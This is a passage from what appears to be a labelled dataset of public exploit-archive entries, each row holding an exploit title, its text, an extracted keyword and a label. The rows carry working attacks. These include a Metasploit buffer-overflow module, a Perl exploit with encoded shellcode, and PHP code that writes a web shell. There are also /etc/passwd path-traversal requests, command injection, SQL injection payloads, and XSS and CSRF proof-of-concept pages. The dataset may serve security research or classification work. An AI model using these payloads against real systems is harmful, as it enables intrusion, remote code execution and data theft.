1.05.2 may be be affected. 			}, 			'Author'         => [ 'Raphael Rigo <devel-metasploit[at]syscall.eu>', 'Julien Tinnes <julien[at]cr0.org>' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 10457 $', 			'References'     => 				[ 					[ 'CVE', '2005-2799'], 					[ 'OSVDB', '19389' ], 					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'], 				], 			'Payload'        => 				{ 					#'BadChars' => ""\x00"", 					'Space'    => 10000, 					'DisableNops' => true, 				}, 			'Arch'		 => ARCH_MIPSLE, 			'Platform'       => 'linux', 			'Targets'        => 				[ 					# the middle of the intersection is our generic address 					#((addrs.map { |n, h| [h[""Bufaddr""],n] }.max[0] + addrs.map { |n, h| [h[""Bufaddr""],n] }.min[0]+9500)/2).to_s(16) 					[ 'Generic', { 'Bufaddr' => 0x10002b50}], 					[ 'Version 1.42.2', { 'Bufaddr' => 0x100016a8 }], 					[ 'Version 2.02.6beta1', { 'Bufaddr' => 0x10001760 }], 					[ 'Version 2.02.7_ETSI', { 'Bufaddr' => 0x10001634 }], 					[ 'Version 3.03.6', { 'Bufaddr' => 0x10001830 }], 					[ 'Version 4.00.7', { 'Bufaddr' => 0x10001AD8 }], 					[ 'Version 4.20.06', { 'Bufaddr' => 0x10001B50 }], 				], 			'DisclosureDate' => 'Sep 13 2005', 			'DefaultTarget' => 0))  		register_options( 			[ 				Opt::RPORT(80), 				Opt::RHOST('192.168.1.1') 			], self.class) 	end  	# Approx size of the remaining space in the data segment after our buffer 	DataSegSize = 0x4000  	def exploit 		c = connect  		print_status(""Return address at 0x#{target['Bufaddr'].to_s(16)}"") 		print_status(""Shellcode length: #{payload.encoded.length}"")  		addr = [target['Bufaddr']].pack('V')  #		original = ""Cache-Control: no-cache\r\nPragma: no-cache\r\nExpires: 0\x00\x00\x00"" #		original += ""\x10\xAD\x43\x00\x18\xAD\x43\x00\x70\x3e\x00\x10\x00\x00\x00\x00"" #		            Pointers in 2.02.6beta1   #		 | BIG BUFFER  | Various structs and function pointers | ... | .ctors | .dtors | ... | .got | #		 | <- 10000 -> | **************************** Pad with return address *********************** #		 I know this is horrible :( - On the other side this is very generic :) 		post_data = ""\x00""*(10000-payload.encoded.length)+payload.encoded+addr*(DataSegSize/4)  		#post_data = ""\x00""*(10000-payload.encoded.length)+payload.encoded+original+addr*2#+""\x24\xad\x43""  #	        res = send_request_cgi({ 'uri' => ""/apply.cgi"", #				  'method' => 'POST', #				  'data' => post_data }); #		print_status(""Malicious request sent, do_ej should be overwritten"")  		req = c.request_cgi({ 'uri' => ""/apply.cgi"", 			'method' => 'POST', 			'data' => post_data 		}) 		c.send_request(req) 		print_status(""Mayhem sent"")   #		req=c.request_cgi('uri' => '/'); #		c.send_request(req); #		print_status(""do_ej triggered"")  		handler 		disconnect 	end  end","[""'apply.cgi'""]",1
29613,"CoolPlayer+ Portable 2.19.4 - Local Buffer Overflow #!/usr/bin/perl  ############################################################################################################ # Exploit Title: CoolPlayer+ Portable v2.19.4 - Local Buffer Overflow # Date: 11-15-2013 # Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift # Vulnerable Software: CoolPlayer+ Portable v2.19.4 # Software Link: http://portableapps.com/apps/music_video/coolplayerp_portable # Version: 2.19.4 # Tested On: Windows XP SP3 # # Credits: Seems various versions of this software have been vulnerable to BOF for a while # -- http://www.exploit-db.com/exploits/4839/ # # Details: Creates an .m3u file for a simple EIP overwrite # -- Buffer is mangled at esp (shellcode size < ~400) so ebx is better choice # -- First overwrite eip with call ebx which points to beginning of buffer # -- Add 300 to ebx to jump past the eip overwrite and into shellcode (available space > 9400) ############################################################################################################  my $buffsize = 10000; # set consistent buffer size  my $jmp = ""\x83\xc3\x64"" x 3; # add 300 to ebx which will jump beyond eip overwrite and into nops/shellcode $jmp = $jmp . ""\xff\xe3""; # jmp ebx  my $junk = ""\x41"" x (260 - length($jmp)); # fill remainder of start of buffer to eip overwrite at offset 260  my $eip = pack('V',0x7c810395); # call ebx [kernel32.dll] which points to start of buffer and our jump code 				# no usable application module found  my $nops = ""\x90"" x 50;  # Calc.exe payload [size 227] # msfpayload windows/exec CMD=calc.exe R |  # msfencode -e x86/shikata_ga_nai -c 1 -b '\x00\x0a\x0d\xff' my $shell = $shell . ""\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9"" . ""\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92"" . ""\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84"" . ""\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e"" . ""\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1"" . ""\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27"" . ""\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb"" . ""\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b"" . ""\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2"" . ""\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37"" . ""\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3"" . ""\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef"" . ""\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb"" . ""\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf"" . ""\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83"" . ""\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3"" . ""\x9a\xca\xc0"";  my $sploit = $jmp.$junk.$eip.$nops.$shell; # build sploit portion of buffer my $fill = ""\x43"" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency my $buffer = $sploit.$fill; # build final buffer  # write the exploit buffer to file my $file = ""coolplayer.m3u""; open(FILE, "">$file""); print FILE $buffer; close(FILE); print ""Exploit file ["" . $file . ""] created\n""; print ""Buffer size: "" . length($buffer) . ""\n"";",['kernel32.dll]'],1
29295,"Microsoft Outlook - ActiveX Control Remote Internet Explorer Denial of Service source: https://www.securityfocus.com/bid/21649/info  The Microsoft Office Outlook Recipient Control is prone to a denial-of-service vulnerability.  An attacker can exploit this issue to trigger denial-of-service conditions in Internet Explorer or other applications that use the ActiveX control.  Specific information regarding affected packages is currently unavailable. This BID will be updated as more information becomes available.  <!-- ------------------------------------------------------------------------ Microsoft Office Outlook Recipient Control (ole32.dll) Denial of Service author: shinnai site: http://shinnai.altervista.org mail: shinnai[at]autistici[dot]org and, always, special thanks to rgod  Tested on Windows Xp Professional SP2 all patched  works with Internet Explorer 6 & 7 ------------------------------------------------------------------------ -->  <html>  <head>  <title></title>  </head>  <object classid=""clsid:0006F023-0000-0000-C000-000000000046"" id=""oLook"" width=""180"" height=""14""></object> </html>  <!-- Just enable the control by clicking on it, then try to close IE. -->",['ActiveX Control'],1
3730,ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow ProFTPD 1.3.0/1.3.0a (mod_ctrls) Local Overflow Exploit (exec-shield)  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/3730.tgz (04132007-pr0ftpd_modctrls.tgz)  # milw0rm.com [2007-04-13],"[""'mod_ctrls'""]",1
30997,"eTicket 1.5.5.2 - 'admin.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/27173/info     eTicket is prone to multiple input-validation vulnerabilities because the application fails to properly sanitize user-supplied input. These vulnerabilities include multiple SQL-injection issues, a cross-site scripting issue, and an authentication-bypass issue.     A successful exploit could allow an attacker to compromise the application, access or modify data, exploit vulnerabilities in the underlying database, or execute arbitrary script code in the browser of an unsuspecting user.     These issues affect eTicket 1.5.5.2; other versions may also be affected.  http://www.example.com/eTicket/admin.php?a=headers&msg=SQL&#039;","[""'admin.php'""]",1
24543,"iOS IPMap 2.5 - Arbitrary File Upload Title: ====== IPMap v2.5 iPad iPhone - Arbitrary File Upload Web Vulnerabilities   Date: ===== 2013-02-18   References: =========== http://www.vulnerability-lab.com/get_content.php?id=866   VL-ID: ===== 866   Common Vulnerability Scoring System: ==================================== 6.3   Introduction: ============= IPMap - IP Address Lookup Details & HTTP Wireless File Sharing with latest WorldWide IP database & FREE Monthly update.  Accuracy: Over 99.8% on a country level and 83% on a city level for the US within a 25 mile radius.   Features: Auto Detect & Lookup Your Real IP address IP address Hostname IP address Country Code ... ...  ... IP address Area Code IP location Map HTTP Wireless File Sharing iTunes File Sync Web Upload File Support Customizable Background from your Photos Album  (Copy of the Homepage: https://itunes.apple.com/us/app/ipmap-ip-address-lookup-details/id416041538 )   Abstract: ========= The Vulnerability Laboratory Research Team discovered an arbitrary file upload vulnerability in the mobile IPMap v2.5 app for the apple ipad & iphone.   Report-Timeline: ================ 2013-02-18:	Public Disclosure   Status: ======== Published   Affected Products: ================== Apple AppStore Product: IPMap - iPad iPhone 2.5   Exploitation-Technique: ======================= Remote   Severity: ========= Critical   Details: ======== A local file include and arbitrary file upload web vulnerability via POST request method is detected in the mobile IPMap v2.5 app  for the apple ipad & iphone. The vulnerability allows remote attackers via POST method to inject local app webserver folders to  request unauthorized local webserver files.  1.1 The main vulnerbility is located in the upload file script of the webserver (http://192.168.0.10:6123/) when processing to load a manipulated  filename via POST request method. The execution of the injected path or file request will occur when the attacker is watching the file index listing of the wifi web application web-server.  1.2 Remote attackers can also unauthorized implement mobile webshells by using multiple file extensions (pentest.php.js.gif) when processing to  upload (submit) via POST request method. The attacker uploads a file with a double extension or multiple extensions and access the file in the  secound step via directory webserver dir listing to compromise the apple iphone or ipad.  Exploitation of the local file include web vulnerability does not require user interaction and also no privileged user account. Successful exploitation of the web vulnerabilities results in app/service manipulation and ipad or iphone compromise via file  include or unauthorized file (webshell) upload attacks.   Vulnerable Application(s): 				[+] WiFilet v1.2 - ITunes or AppStore (Apple)  Vulnerable Module(s): 				[+] File Upload via Submit (Web Server) [Remote]  Vulnerable Parameter(s): 				[+] file > filename  Affected Module(s): 				[+] File Dir Index - Listing   Proof of Concept: ================= Both vulnerabilities can be exploited by remote attackers without privileged application user account and also without required user interaction. For demonstration or reproduce ...  1.1 PoC: (POST) -----------------------------307341202725627 Content-Disposition: form-data; name=""file""; filename=""../../../../cmd>home>tmp%00<'.png"" Content-Type: image/png ����   Review: File Dir Listing  <html><head> <meta http-equiv=""content-type"" content=""text/html; charset=ISO-8859-1""><title>IPMap</title> <style>body { background-color:#f0f7fd; font-family:Tahoma,Arial,Helvetica,sans-serif;  font-size:18x; padding:15px; margin-left:15%; margin-right:15%; } </style></head><body> <h2 style=""background-color:#6897ff; margin:0; color:#fff; padding:5px 10px; border: 1px outset #aaa;border-bottom: 0px;"">IPMap</h2> <h4 style=""background-color:#6897ff;margin:0; color:#fff; padding:0px 10px 8px 10px; border: 1px outset #aaa; border-top: 0px;""> The following files are hosted live from the iPhone's Docs folder.</h4><p><table style=""text-align:center; border-color:#9bc0d2;  background:#f0f7fd; color:#4e697a;  margin:0 auto;"" border=""1"" cellpadding=""0"" cellspacing=""0""><tbody><tr height=""30""><td width=""400""> <strong>File Name</strong></td><td width=""400""><strong>File Info</strong></td></tr><tr height=""30""> <td><a href=""http://192.168.0.10:6123/../../../../cmd>home>tmp%00<'"">%20%20%20%20&""><iframe src=""../../../../cmd>home>tmp%00<'"">%20%20%20%20&""> %20%20%20%20</a></td><td>(27.3 Kb, 2013-02-07 07:00:31 +0000)</td></tr></table></p><form action=""""  method=""post"" enctype=""multipart/form-data"" name=""form1""  id=""form1""><table border=""0"" cellpadding=""0"" cellspacing=""0""  style=""text-align:center; margin:0 auto;""><tr  height=""50""><td width=""400""><label>upload file<input  type=""file"" name=""file"" id=""file"" /></label></td><td  width=""400""><label><input type=""submit"" name=""button""  id=""button"" value=""Submit"" /> <font size=""-1"">* Please do NOT  upload index.htm or  index.html</font></label></td></tr></table></form></body></html> </iframe></a></td></tr></tbody></table></p></body></html>   1.2 PoC: (POST) -----------------------------307341202725627 Content-Disposition: form-data; name=""file""; filename=""pentest.php.js.html.htm.xml.png"" Content-Type: image/gif   Reference(s): http://192.168.0.10:6123/   Risk: ===== The security risk of the arbitrary file upload web vulnerability via POST request method is estimated as critical.   Credits: ======== Vulnerability Laboratory [Research Team]  -    Benjamin Kunz Mejri (bkm@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2013 | Vulnerability Laboratory  --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",['pentest.php.'],1
45897,"WebOfisi E-Ticaret V4 - 'urun' SQL Injection # Exploit Title: WebOfisi E-Ticaret V4 - 'urun' SQL Injection # Date: 2018-11-21 # Exploit Author: Özkan Mustafa Akkuş (AkkuS) # Contact: https://pentest.com.tr # Vendor Homepage: https://www.web-ofisi.com # Software Demo: http://demobul.net/eticaretv4/ # Software Link: https://drive.google.com/file/d/1ZghFSsYto-Vpv3PXunx8xm2g-Gs3HJwz/view?usp=sharing # Version: v4.0 # Category: Webapps # Tested on: XAMPP for Linux # Description: E-Ticaret v4 is a professional online shopping script with many features. # Vulnerabilities have been discovered during penetration testing.  # PoC : SQLi : # Request : /eticaretv4/arama.html?kategori=20&urun=test  # Parameter : urun (GET) # Type : boolean-based blind # Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause # Payload:   kategori=20&urun=test"") RLIKE (SELECT (CASE WHEN (6525=6525)THEN 0x74656474 ELSE 0x28 END)) AND (""YWLa""=""YWLa  # Type: error-based # Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) # Payload:   kategori=20&urun=test"") OR (SELECT 6556 FROM(SELECT COUNT(*),CONCAT(0x71626b6b71,(SELECT(ELT(6556=6556,1))),0x716b716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (""ExaV""=""ExaV  # Type: stacked queries # Title: MySQL < 5.0.12 stacked queries (heavy query) # Payload:   kategori=20&urun=test"");SELECT BENCHMARK(5000000,MD5(0x44527964)) AND (""KGaO""=""KGaO  # Type: AND/OR time-based blind # Title: MySQL >= 5.0.12 OR time-based blind # Payload:   kategori=20&urun=test"") OR SLEEP(5) AND (""sDnb""=""sDnb  # PoC : XSS : # Payload : http://demobul.net/eticaretv4/arama.html?kategori=20&urun=%3E%27%3E%22%3E%3Cimg%20src=x%20onerror=alert%280%29%3E","[""'urun'""]",1
11916,"Joomla! Component com_agency - SQL Injection # Title : Joomla Component com_agency SQL Injection Vulnerability # Author: DevilZ TM # Data  : 2010-03-28  [~]######################################### InformatioN #############################################[~]   [~] Title     : Joomla Component com_agency SQL Injection Vulnerability [~] Author    : DevilZ TM By D3v1l [~] Homepage  : http://www.DEVILZTM.com [~] Email     : Expl0it@DevilZTM.Com [~] Contact   : D3v1l.blackhat@yahoo.com   [~]#########################################   ExploiT   #############################################[~]   [~] Vulnerable File :   http://127.0.0.1/index.php?option=com_agency&task=view&aid=[SQL]   [~] ExploiT         :   -1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14   [~] Example         :   http://127.0.0.1/index.php?option=com_agency&task=view&aid=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14     [~]######################################### ThankS To ... ############################################[~]   [~] Special Thanks To My Best FriendS :   Exim0r , Raiden , b3hz4d , PLATEN , M4hd1 , Net.Edit0r , Amoo Arash , r3d-r0z AND All Iranian HackerS   [~] IRANIAN Young HackerZ   [~]#########################################   FinisH :D   #############################################[~]",['index.php?'],1
18888,"OpenKM Document Management System 5.1.7 - Command Execution ######################################################################## ## # # COMPASS SECURITY ADVISORY http://www.csnc.ch/  ######################################################################## ## # # ID:      COMPASS-2012-002 # Product: OpenKM Document Management System 5.1.7 [1] # Vendor:  OpenKM http://www.openkm.com/ # Subject: Cross-site Request Forgery based OS Command Execution # Risk:    High # Effect:  Remotely exploitable # Author:  Cyrill Brunschwiler (cyrill.brunschwiler@csnc.ch) # Date:    January 2nd 2012 # ######################################################################## ##  Description: ------------ Cyrill Brunschwiler, Security Analyst at Compass Security Network Computing, Switzerland discovered a web application issue based OS command execution flaw in the OpenKM solution. OpenKM does allow administrative users (having the AdminRole) to run bean shell scripts. Due to the flaw, an attacker could lure an OpenKM administrator to a malicious web page that causes arbitrary OS commands being run in the administrators OpenKM session context. This is possible because OpenKM does not implement access control mechanisms to avoid so called Cross-site Request Forgery [2] (a.k.a. CSRF, XSRF, session riding, forceful browsing). The commands are being executed silently. In the end, this allows an attacker to run OS commands with the privileges of the process owner of the application server (JBOSS).  Vulnerable: ----------- OpenKM version 5.1.7  Not vulnerable: --------------- OpenKM version 5.1.8  Fix: ---- To avoid this issue the application must introduce Anti-XSRF tokens for the web-based administrative interface. To avoid arbitrary command execution the admin/scripting.jsp could be removed from the OpenKM.ear before the application is being deployed. Note, the cron job functionality allows to run *.jar and BeanShell scripts as well.  Exploit: -------- Login as administrator (having the AdminRole) and call the URL in a different browser window http://example.com/OpenKM/admin/scripting.jsp?script=String%5B%5D+cmd+%3 D+%7B%22%2Fbin%2Fsh%22%2C+%22-c%22%2C+%22%2Fbin%2Fecho+pwned+%3E+%2Ftmp% 2Fpoc%22%7D%3B%0D%0ARuntime.getRuntime%28%29.exec%28cmd%29%3B  Alternatively the administrator could browse a prepared HTML page in a new tab <html> <body> <script> img = new Image(); img.src=""http://example.com/OpenKM/admin/scripting.jsp?script=String%5B% 5D+cmd+%3D+%7B%22%2Fbin%2Fsh%22%2C+%22-c%22%2C+%22%2Fbin%2Fecho+pwned+%3 E+%2Ftmp%2Fpoc%22%7D%3B%0D%0ARuntime.getRuntime%28%29.exec%28cmd%29%3B"" </script> </body> </html>  The above exploit does nothing else than just creating a file in /tmp  String[] cmd = {""/bin/sh"", ""-c"", ""/bin/echo pwned > /tmp/poc""}; Runtime.getRuntime().exec(cmd);  Some might also want to browse directories http://example.com/OpenKM/admin/scripting.jsp?script=import+java.io.*%3B %0D%0A%0D%0Atry+%7B%0D%0A++++String+ls_str%3B%0D%0A++++Process+ls_proc+% 3D+Runtime.getRuntime%28%29.exec%28%22%2Fbin%2Fls+-lah%22%29%3B%0D%0A+++ +DataInputStream+ls_in+%3D+new+DataInputStream%28ls_proc.getInputStream% 28%29%29%3B%0D%0A%0D%0A++++while+%28%28ls_str+%3D+ls_in.readLine%28%29%2 9+%21%3D+null%29+++++++++++%0D%0A++++++++print%28ls_str+%2B+%22%3Cbr%3E% 22%29%3B%0D%0A%0D%0A%7D+catch+%28IOException+e%29+%7B%0D%0A%7D  import java.io.*;  try {     String ls_str;     Process ls_proc = Runtime.getRuntime().exec(""/bin/ls -lah"");     DataInputStream ls_in = new DataInputStream(ls_proc.getInputStream());      while ((ls_str = ls_in.readLine()) != null)                    print(ls_str + ""<br>"");  } catch (IOException e) { }  Timeline: --------- August 6th, Vulnerability discovered August 9th, Vendor contacted August 10th, Vendor notified December 1st, Patched version released January 2nd, Advisory released  References: ----------- [1] OpenKM http://www.openkm.com/ is an Free/Libre document management system that provides a web interface for managing arbitrary files. OpenKM includes a content repository, Lucene indexing, and jBPM workflow. The OpenKM system was developed using Java technology.  [2] Cross-site Request Forgery https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.",['CSRF XSRF'],1
19406,"symantec Web gateway 5.0.2.8 - Multiple Vulnerabilities Software: Symantec Web Gateway Current Software Version: 5.0.2.8 Product homepage: www.symantec.com Author: S2 Crew [Hungary] CVE: CVE-2012-0297, CVE-2012-0298, ???  File include:         https://192.168.82.207/spywall/previewProxyError.php?err=../../../../../../../../etc/passwd  File include and OS command execution:         http://192.168.82.207/spywall/releasenotes.php?relfile=../../../../../../etc/passwd         You can execute OS commands just include the error_log:         /usr/local/apache2/logs/         -rw-r--r--   1 root   root  5925 Nov 15 07:25 access_log         -rw-r--r--   1 root   root  3460 Nov 15 07:21 error_log          Make a connection to port 80:         <?php         $f = fopen('/var/www/html/spywall/cleaner/cmd.php','w');         $cmd = ""<?php system(\$_GET['cmd']); ?>"";         fputs($f,$cmd);         fclose($f); 		print ""Shell creation done<br>"";         ?>  Arbitary file download and delete:         https://192.168.82.207/spywall/download_file.php?d=/tmp/addroutelog&name=addroutelog 	d parameter: the complete filename          After the download process application removes the original file with root access! :)          Command execution methods:         1.Method         Download and delete the /var/www/html/ciu/.htaccess file.         After it you can access the ciu interface on web.         There is an upload script: /ciu/uploadFile.php 	User can control the filename and the upload location:         $_FILES['uploadFile'];         $_POST['uploadLocation'];          2.Method         <form action=""https://192.168.82.192/ciu/remoteRepairs.php"" method=""POST"" enctype=""multipart/form-data"">         <input type=""file"" name=""uploadFile"">         <input type=""text"" name=""action"" value=""upload"">         <input type=""text"" name=""uploadLocation"" value=""/var/www/html/spywall/cleaner/"">         <input type=""hidden"" name=""configuration"" value=""test"">         <input type=""submit"" value=""upload!"">         </form> 	 	The ""/var/www/html/spywall/cleaner"" is writeable by www-data.  Command execution after authentication:          http://192.168.82.207/spywall/adminConfig.php (this is deprecated config file, it should be remove)          From the modified POST message:         Content-Disposition: form-data; name=""pingaddress""         127.0.0.1`whoami>/tmp/1234.txt`",['uploadFile.php '],1
4904,"Binn SBuilder - 'nid' Blind SQL Injection --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+              Binn SBuilder (nid) Remote Blind Sql Injection Vulnerabily            +==-- --==+====================================================================================+==--                      [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]  [+] Info:  [~] Software: Binn SBuilder [~] HomePage: http://www.cms.ge/ [~] Exploit: Blind Sql Injection [High] [~] Where: full_text.php?nid= [~] Bug Found By: JosS [~] Contact: sys-project[at]hotmail.com [~] Web: http://www.spanish-hackers.com [~] Dork: ""Powered by CMS.GE"" [~] Dork2: priv8!  [+] Important tables and columns:  [*] Tables:  [~] Table: binn_users  [*] Columns:  [~] Column: bu_id [~] Column 2: bu_login [~] Column 3: bu_pass [~] Column 4: bu_name [~] Column 5: bu_admin [~] Column 6: bu_last_ip [~] Column 7: bu_last_date  [+] Compression:  [~] True: http://localhost/[path]/full_text.php?nid=[NUM] and 1=1 [~] False: http://localhost/[path]/full_text.php?nid=[NUM] and 1=2 [~] Example: http://localhost/[path]/full_text.php?nid=4855 and 1=1 [~] Example2: http://localhost/[path]/full_text.php?nid=4855 and 1=2 [~] If you see the Web correctly is true, if it is not false.  [+] Exploding:  [*] Checking table:   [~] Exploit: http://localhost/[path]/full_text.php?nid=[NUM] AND (SELECT Count(*) FROM [TABLE]) >= 0 [~] Exploit2: http://localhost/[path]/full_text.php?nid=[NUM] and exists (select * from [TABLE]) [~] Example: http://localhost/[path]/full_text.php?nid=4855 AND (SELECT Count(*) FROM binn_users) >= 0 [~] Example2: http://localhost/[path]/full_text.php?nid=4855 and exists (select * from binn_users) [~] If you don't see any error, it is that table exist.  [*] Checking columns number of table:  [~] Exploit: http://localhost/[path]/full_text.php?nid=[NUM] AND (SELECT Count(*) FROM [TABLE]) = [NUMBER] [~] Example: http://localhost/[path]/full_text.php?nid=4855 AND (SELECT Count(*) FROM binn_users) = 7 [~] If you don't see any error, the table has 6 columns.  [*] Checking columns of table:  [~] Exploit: http://localhost/[path]/full_text.php?nid=[NUM] AND (SELECT Count([COLUMN]) FROM [TABLE]) >= 0 [~] Example: http://localhost/[path]/full_text.php?nid=4855 AND (SELECT Count(bu_pass) FROM binn_users) >= 0 [~] If you don't see any error, the column exists.  [*] Admin Password; Noob or Lammer?:  [~] Exploit: Priv8 [~] Example: Priv8 [~] Priv8 , xD.  --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+                                       JosS                                         +==-- --==+====================================================================================+==--                                        [+] [The End]  # milw0rm.com [2008-01-13]","[""'nid'""]",1
36140,"Toko Lite CMS 1.5.2 - HTTP Response Splitting / Cross-Site Scripting source: https://www.securityfocus.com/bid/49673/info  Toko LiteCMS is prone to an HTTP-response-splitting vulnerability and multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user, steal cookie-based authentication credentials, and influence how web content is served, cached, or interpreted. This could aid in various attacks that try to entice client users into a false sense of trust.  Toko LiteCMS 1.5.2 is vulnerable; other versions may also be affected.   Cross Site Scripting Vulnerabilities  <html> <title>Toko Lite CMS 1.5.2 (EditNavBar.php) Multiple Parameters XSS POST Injection</title> <body bgcolor=""#1C1C1C""> <script type=""text/javascript""> function xss(){document.forms[""xss""].submit();} </script> <br /><br /> <form action=""http://www.example.com/tokolite1.5.2/editnavbar.php"" enctype=""application/x-www-form-urlencoded"" method=""POST"" id=""xss""> <input type=""hidden"" name=""currPath"" value=&#039;""><script>alert(1)</script>&#039; /> <input type=""hidden"" name=""path"" value=&#039;""><script>alert(2)</script>&#039; /> </form> <a href=""javascript: xss();"" style=""text-decoration:none""> <b><font color=""red""><center><h3>Exploit!</h3></center></font></b></a><br /><br /> </body></html>   HTTP Response Splitting  ==================================================================== /edit.php: --------------------------------------------------------------------   3: $charSet = ""iso-8859-1"";  4: $dir = ""ltr"";  5:  6: if ( isset( $_POST[ ""charSet"" ] ) )  7: {  8:     $charSet = $_POST[ ""charSet"" ];  9: 10:     if ( $charSet == ""windows-1255"" ) 11:     { 12:        $dir = ""rtl""; 13:     } 14: } 15: 16: header( ""Content-Type: text/html; charset="" . $charSet );",['EditNavBar.php)'],1
30631,Google Mini Search Appliance 3.4.14 - 'IE' Cross-Site Scripting source: https://www.securityfocus.com/bid/25894/info  Google Mini Search Appliance is prone to a cross-site scripting vulnerability.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  This issue affects Google Mini Search Appliance 3.4.14; other versions may also be affected.  http://www.example.com/search?ie=[ Evil Code ]&site=x&output=xml_no_dtd'&client=x&proxystylesheet=x',"[""'IE'""]",0
29201,"Apple Mac OSX 10.4.x - 'Shared_Region_Make_Private_Np' Kernel Function Local Memory Corruption /* source: https://www.securityfocus.com/bid/21349/info  Apple Mac OS X is prone to a local memory-corruption vulnerability. This issue occurs when the operating system fails to handle specially crafted arguments to a system call.   Attackers may exploit this issue to cause a kernel panic, effectively denying further service to legitimate users. Due to the nature of this issue, successful exploits may potentially result in the execution of arbitrary machine code in the context of the affected kernel, but this has not been confirmed.  Mac OS X version 10.4.8 is vulnerable to this issue; other versions may also be affected. */   /*  * Copyright 2006 (c) LMH <lmh@info-pull.com>.  * All Rights Reserved.  * ----             *               .---. .---.   *              :     : o   :    me want cookie and clues! L0W LEVA! - A  J. H  *          _..-:   o :     :-.._    /   *      .-''  '  `---' `---' ""   ``-.      *    .'   ""   '  ""  .    ""  . '  ""  `.   *   :   '.---.,,.,...,.,.,.,..---.  ' ;  *   `. "" `.                     .' "" .' kudos to ilja, kevin and icer.  *    `.  '`.                   .' ' .'           ""proof of concept"" for  *     `.    `-._           _.-' ""  .'  .-------.       MOKB-28-11-2006.  *       `. ""    '""--...--""'  . ' .'  .'  · o   ·`.  *       .'`-._'    "" .     "" _.-'`. :  C o C o A :  *     .'      ```--.....--'''    ' `:_ o      o  :  *   .'    ""     '         ""     ""   ; `.;"";"";""; _'  *  ;         '       ""       '     . ; .' ; ; ;  * ;     '         '       '   ""    .'      .-'  * '  ""     ""   '      ""           ""    _.-'  */  #include <stdio.h> #include <sys/types.h> #include <fcntl.h>  int main() { 		/* shared_region_make_private_np 